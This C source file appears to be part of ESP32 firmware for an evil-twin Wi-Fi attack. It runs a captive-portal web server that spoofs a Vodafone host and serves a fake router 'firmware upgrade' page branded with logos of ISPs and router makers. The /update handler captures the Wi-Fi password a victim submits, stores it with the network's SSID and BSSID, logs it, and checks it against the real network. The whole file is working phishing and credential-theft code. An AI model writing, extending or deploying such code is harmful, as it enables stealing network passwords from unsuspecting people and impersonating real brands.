#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "spi_flash_mmap.h"
#include "esp_sleep.h"

#include "esp_wifi.h"
#include "esp_event.h"
#include "freertos/event_groups.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/api.h>
#include <lwip/netdb.h>
#include "esp_http_server.h"

#include "server.h"
#include "evil_twin.h"
#include "passwordMng.h"

#include "web/web_page.h"
#include "web/web_net_manager.h"

#include "web/logo/vodafone.h"
#include "web/logo/fastweb.h"
#include "web/logo/skywifi.h"
#include "web/logo/wind.h"
#include "web/logo/tim.h"
#include "web/logo/tplink.h"
#include "web/logo/huawei.h"
#include "web/logo/generic.h"
#include "web/loader.h"
#include "web/firmware_upgrade/index.h"

#define CHUNK_SIZE 512
#define CAPTIVE_PORTAL_URL "http://192.168.4.1/index.html"

static const char *TAG = "HTTPD";
static const char *host = "vodafone.station";
static httpd_handle_t server = NULL;
static target_info_t target = { 0 };


static void httpd_send_chunked_data(httpd_req_t *req, const char *buffer, size_t len, const char *response_type)
{
	size_t bytes_remaining = len-1;
    size_t offset = 0;

	/* Set basic text/html if response type is not specified */
	if( response_type == NULL )
	{
		httpd_resp_set_type(req, "text/html");
	}
	else
	{
		httpd_resp_set_type(req, response_type);
	}

	httpd_resp_set_hdr(req, "Connection", "keep-alive");
    while (bytes_remaining > 0) 
	{
        size_t chunk_size = (bytes_remaining > CHUNK_SIZE) ? CHUNK_SIZE : bytes_remaining;
        httpd_resp_send_chunk(req, buffer + offset, chunk_size);
        offset += chunk_size;
        bytes_remaining -= chunk_size;
    }
	httpd_resp_send_chunk(req, NULL, 0);
}


/**
 * @brief This function manage the file in the virtual folder /static/
 * 
 * @param req 
 */
static void web_virtual_static_folder_manager(httpd_req_t *req)
{
	/* bootstrap.min.css */
	if( strcmp(req->uri, "/static/bootstrap.min.css") == 0 )
	{
		//httpd_send_chunked_data(req, bootstrap_min_css, sizeof(bootstrap_min_css), "text/css");
	}
	/* bootstrap.min.js */
	else if( strcmp(req->uri, "/static/bootstrap.min.js") == 0 )
	{
		//httpd_send_chunked_data(req, bootstrap_min_js, sizeof(bootstrap_min_js), "application/javascript");
	}
	/* jquery.min.js */
	else if( strcmp(req->uri, "/static/jquery.min.js") == 0 )
	{
		//httpd_send_chunked_data(req, jquery_min_js, sizeof(jquery_min_js), "application/javascript");
	}
}


/**
 * @brief This function manage the file in the virtual folder /logo/
 * 
 * @param req 
 */
static void web_virtual_logo_folder_manager(httpd_req_t *req)
{
	/* Lookup table */
    static const logo_entry_t logo_table[] = {
        { "/logo/Generic.png", generic_logo, sizeof(generic_logo) },
        { "/logo/Vodafone.png", vodafone_logo, sizeof(vodafone_logo) },
        { "/logo/Fastweb.png", fastweb_logo, sizeof(fastweb_logo) },
        { "/logo/Skywifi.png", skywifi_logo, sizeof(skywifi_logo) },
        { "/logo/Wind.png", wind_logo, sizeof(wind_logo) },
        { "/logo/TIM.png", tim_logo, sizeof(tim_logo) },
        { "/logo/TP-Link.png", tplink_logo, sizeof(tplink_logo) },
        { "/logo/Huawei.png", huawei_logo, sizeof(huawei_logo) }
    };
    size_t table_size = sizeof(logo_table) / sizeof(logo_table[0]);
	for (size_t i = 0; i < table_size; ++i) 
	{
        if (strcmp(req->uri, logo_table[i].uri) == 0) {
            httpd_send_chunked_data(req, logo_table[i].logo, logo_table[i].logo_size, "image/png");
            return;
        }
    }
	/* Generic logo */
	httpd_send_chunked_data(req, generic_logo, sizeof(generic_logo), "image/png");
}


/**
 * @brief Manage the firmware upgrade attack index request
 * 
 * @param req 
 */
static void firmware_upgrade_index_manager(httpd_req_t *req)
{
	httpd_resp_set_hdr(req, "Connection", "keep-alive");
	httpd_resp_set_type(req, "text/html");
	httpd_resp_send_chunk(req, fu_index_header_html, sizeof(fu_index_header_html));

	/* Fill data */
	char script_data[150];
	snprintf(script_data, sizeof(script_data), fu_index_script_html, vendorToString(target.vendor), (char *)&target.ssid, vendorToString(target.vendor));
	httpd_resp_send_chunk(req, script_data, strlen(script_data));

	httpd_resp_send_chunk(req, fu_index_body_html, sizeof(fu_index_body_html));
	httpd_resp_send_chunk(req, NULL, 0);
}


/**
 * @brief Get user input password ad save it
 * 
 * @param req 
 */
static esp_err_t save_password_manager(httpd_req_t *req)
{
	char buffer[256] = { 0 };
    int ret = 0;

    ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
    if (ret <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }

	char password[64] = { 0 };
    sscanf(buffer, "password=%63[^&]", password);

	/* Save password */
	memset(&buffer, 0, sizeof(buffer));
	snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", (char *)&target.ssid, target.bssid[0], target.bssid[1], target.bssid[2], target.bssid[3], target.bssid[4], target.bssid[5], password);
	password_manager_save(buffer);
	ESP_LOGI(TAG, "Password saved: %s", buffer);

	/* Check password and send response */
	if( evil_twin_check_password(password) == true )
	{
		httpd_resp_send(req, "ok", HTTPD_RESP_USE_STRLEN);
		httpd_resp_send(req, NULL, 0);

		/* Stop attack */
		//evil_twin_stop_attack();
		/* Enter in deep sleep to preserve battery power */
		/* Only hardware wakeup (Reset button) */
		//esp_deep_sleep_start();
	}
	else
	{
		httpd_resp_send(req, "bad", HTTPD_RESP_USE_STRLEN);
		httpd_resp_send(req, NULL, 0);
	}
	return ESP_OK;
}


/**
 * @brief All request all redirected here
 * 
 * @param req 
 */
static void captive_portal_redirect(httpd_req_t *req)
{
	/* Index */
	if( strcmp(req->uri, "/index.html") == 0 )
	{
		switch(target.attack_scheme)
		{
			case FIRMWARE_UPGRADE:
				firmware_upgrade_index_manager(req);
				break;
			
			case WEB_NET_MANAGER:
				break;

			case PLUGIN_UPDATE:
				break;

			case OAUTH_LOGIN:
				break;

			default:
				break;
		}
		return;
	}
	/* loader.html same for all */
	else if( strcmp(req->uri, "/loader.html") == 0 )
	{
		httpd_send_chunked_data(req, loader_html, sizeof(loader_html), NULL);
	}
	/* Static folder manager */
	else if( strstr(req->uri, "/static/") != NULL )
	{
		web_virtual_static_folder_manager(req);
	}
	/* logo folder manager */
	else if( strstr(req->uri, "/logo/") != NULL )
	{
		web_virtual_logo_folder_manager(req);
	}
	/* favicon.ico */
	else if( strcmp(req->uri, "/favicon.ico") == 0 )
	{
		httpd_resp_send(req, NULL, 0);
	}
	/* Activate captive portal */
	else
	{
		httpd_resp_set_status(req, "302 Found");
		httpd_resp_set_hdr(req, "Host", host);
		httpd_resp_set_hdr(req, "Location", CAPTIVE_PORTAL_URL);
		httpd_resp_send(req, NULL, 0);
		return;
	}
}


static esp_err_t redirect_handler(httpd_req_t *req) 
{
	/* Request information */
	char Host[64] = { 0 };
	char UserAgent[128] = { 0 };
	char ContentType[64] = { 0 };
	char ContentLen[8] = { 0 };
	char Referer[64] = { 0 };

	/* Read request header */
	int len = httpd_req_get_hdr_value_len(req, "Host");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Host", Host, len+1);
    }
	len = httpd_req_get_hdr_value_len(req, "User-Agent");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "User-Agent", UserAgent, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Type");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Type", ContentType, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Length");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Length", ContentLen, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Referer");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Referer", Referer, len);
    }

	captive_portal_redirect(req);
    return ESP_OK;
}


void http_attack_server_start(target_info_t *_target_info)
{
	if( server != NULL )
	{
		ESP_LOGE(TAG, "Attack server already started.");
		return;
	}

	/* Copy target info */
	memcpy(&target, _target_info, sizeof(target_info_t));

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
	config.ctrl_port = 81;
	config.server_port = 80;
	config.uri_match_fn = httpd_uri_match_wildcard;
	config.max_open_sockets = 10;
	config.max_resp_headers = 16;
	config.recv_wait_timeout = 10;
	config.send_wait_timeout = 10;
	config.lru_purge_enable = true;

    if (httpd_start(&server, &config) == ESP_OK) 
	{
        httpd_uri_t redirect_uri = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = redirect_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(server, &redirect_uri);

		httpd_uri_t update_uri = {
            .uri = "/update",
            .method = HTTP_POST,
            .handler = save_password_manager,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(server, &update_uri);
    }
	else
	{
		ESP_LOGE(TAG, "Failed to start captive portal server.");
	}
}


void http_attack_server_stop(void)
{
	if( server != NULL )
    {
        if( httpd_stop(server) != ESP_OK )
        {
            ESP_LOGD(TAG, "Failed to stop attack server.");
            return;
        }
    }
}